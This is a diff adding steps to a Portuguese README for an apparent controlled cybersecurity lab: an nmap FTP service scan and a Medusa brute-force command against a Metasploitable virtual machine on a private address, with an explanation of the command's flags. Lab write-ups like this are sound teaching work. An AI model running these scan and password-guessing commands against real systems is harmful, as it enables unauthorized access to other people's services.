@@ -22,3 +22,15 @@ Este projeto tem com objetivo demonstrar, em ambiente controlado, a execução d
 
 * [Configuração REDE KALI](https://github.com/lfralipe/RCHLCiberseguranca/blob/main/kali_rede001.png)
 * [Configuração REDE Metasploitable](https://github.com/lfralipe/RCHLCiberseguranca/blob/main/metasploitable_rede001.png)
+
+
+### Primeira fase do ataque - Descoberta dos serviços
+- Comando -> nmap -p 21 -sV 192.168.1.3
+* [NMAP](https://github.com/lfralipe/RCHLCiberseguranca/blob/main/ataque_nmap001.png)
+
+### Segunda fase do ataque - Medusa - ataque de força bruta.
+**Obs** Como é apenas um simples teste, para executar está tarefa criei um dicionário com apenas uma senha "msfadmin".
+- Comando -> medusa -h 192.168.1.3 -u msfadmin -P lista_senhas.txt -M ftp
+    - O comando acima funciona como: medusa é o app, o -h informa o alvo, -u msfadmin informa que irá atrás do usuário msfadmin, caso eu tivesse uma lista passaria o -U lista_usuarios.txt
+      -P lista_senha.txt é a lista de password e o -M ftp informa o serviço que será o alvo.
+* [MEDUSA](https://github.com/lfralipe/RCHLCiberseguranca/blob/main/ataque_medusa001.png)
